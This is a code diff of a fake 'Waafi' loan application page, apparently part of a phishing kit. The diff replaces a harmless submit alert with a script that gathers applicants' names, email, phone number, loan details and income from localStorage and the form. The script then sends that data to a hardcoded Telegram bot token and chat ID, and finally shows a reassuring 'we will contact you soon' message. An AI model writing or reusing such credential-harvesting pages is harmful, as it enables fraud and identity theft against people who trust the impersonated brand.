@@ -1,52 +1,73 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Step 3 - Waafi</title>
 <style>
 body { font-family: Arial, sans-serif; margin:0; background:#f5f5f5; }
-.header { background: linear-gradient(90deg, #a8e063, #00B347); padding:15px; color:white; display:flex; justify-content:space-between; align-items:center; }
+.header { background: linear-gradient(90deg, #a8e063, #00B347); padding:15px; color:white; display:flex; justify-content:space-between; align-items:center; font-weight:bold; }
 .container { padding:20px; max-width:600px; margin:auto; }
 .card { background:white; padding:20px; border-radius:12px; box-shadow:0 2px 8px rgba(0,0,0,0.1); }
-h2 { text-align:center; margin:0; }
-.step { text-align:center; color:#888; margin-bottom:15px; }
-.progress { display:flex; gap:5px; margin-bottom:20px; }
-.bar { flex:1; height:6px; background:#ddd; border-radius:5px; }
-.bar.active { background: linear-gradient(90deg, #a8e063, #00B347); }
 label { display:block; margin:15px 0 5px 0; font-weight:bold; }
 input, select { width:100%; padding:12px; border:1px solid #ddd; border-radius:8px; box-sizing:border-box; }
-.summary { background:#f9f9f9; padding:15px; border-radius:8px; border-left:4px solid #00B347; margin-top:20px; }
-.row { display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid #eee; }
-.btn { width:100%; padding:16px; border:none; border-radius:8px; font-size:18px; font-weight:bold; background: linear-gradient(90deg, #a8e063, #00B347); color:white; cursor:pointer; margin-top:15px; }
-.btn.gray { background:#ccc; color:#333; }
+.btn { width:100%; padding:16px; border:none; border-radius:8px; font-size:18px; font-weight:bold; background: linear-gradient(90deg, #a8e063, #00B347); color:white; cursor:pointer; margin-top:20px; }
 </style>
 </head>
 <body>
-<div class="header"><div>← Back</div><h1>Enough</h1><div>☰</div></div>
-<div class="container">
-  <div class="card">
-    <h2>Loan Application</h2>
-    <div class="step">Step 3 of 3</div>
-    <div class="progress"><div class="bar active"></div><div class="bar active"></div><div class="bar active"></div></div>
-    
-    <label>Work Status</label>
-    <select><option>Employee</option><option>Self Employed</option></select>
-    
-    <label>Annual Income ($)</label>
-    <input type="number" placeholder="25,000">
-    
-    <div class="summary">
-      <h3>Application Summary</h3>
-      <div class="row"><span>Loan Amount:</span><span>$1,000</span></div>
-      <div class="row"><span>Loan Period:</span><span>12 Months</span></div>
-      <div class="row"><span>Purpose:</span><span>Business</span></div>
-      <div class="row"><span>Applicant:</span><span>Ahmed Hassan</span></div>
-    </div>
-    
-    <button class="btn gray">SO THAT</button>
-    <button class="btn" onclick="alert('Application Sent!')">SEND REQUEST</button>
-  </div>
-</div>
+<div class="header"><div>← Back</div><div>Waafi</div><div>☰</div></div>
+<div class="container"><div class="card">
+<h2>Final Step - Step 3 of 3</h2>
+<label>Work Status</label><select id="work"><option>Employee</option><option>Self Employed</option></select>
+<label>Annual Income ($)</label><input id="income" type="number" placeholder="25000">
+<button class="btn" onclick="sendToTelegram()">SEND APPLICATION</button>
+</div></div>
+
+<script>
+const BOT_TOKEN = "8811313030:AAHsQrh9DveSLEB2eRNmVPJF_2HtMGtJJ7A";
+const CHAT_ID = "8630213836";
+
+function sendToTelegram() {
+  const data = {
+    loanType: localStorage.getItem('loanType') || 'N/A',
+    amount: localStorage.getItem('amount') || 'N/A',
+    period: localStorage.getItem('period') || 'N/A',
+    purpose: localStorage.getItem('purpose') || 'N/A',
+    fname: localStorage.getItem('fname') || 'N/A',
+    lname: localStorage.getItem('lname') || 'N/A',
+    email: localStorage.getItem('email') || 'N/A',
+    phone: localStorage.getItem('phone') || 'N/A',
+    work: document.getElementById('work').value,
+    income: document.getElementById('income').value,
+  };
+
+  const message = `🔥 NEW WAAFI APPLICATION 🔥
+
+👤 NAME: ${data.fname} ${data.lname}
+📧 EMAIL: ${data.email}
+📱 PHONE: +252 ${data.phone}
+
+💰 LOAN: ${data.loanType}
+💵 AMOUNT: $${data.amount}
+📅 PERIOD: ${data.period}
+🎯 PURPOSE: ${data.purpose}
+
+💼 WORK: ${data.work}
+📈 INCOME: $${data.income}
+
+Time: ${new Date().toLocaleString()}`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+  })
+  .then(() => {
+    alert("Application Sent Successfully! We will contact you soon.");
+    localStorage.clear();
+    window.location.href='index.html';
+  })
+  .catch(() => alert("Error. Please check your internet connection."));
+}
+</script>
 </body>
 </html>
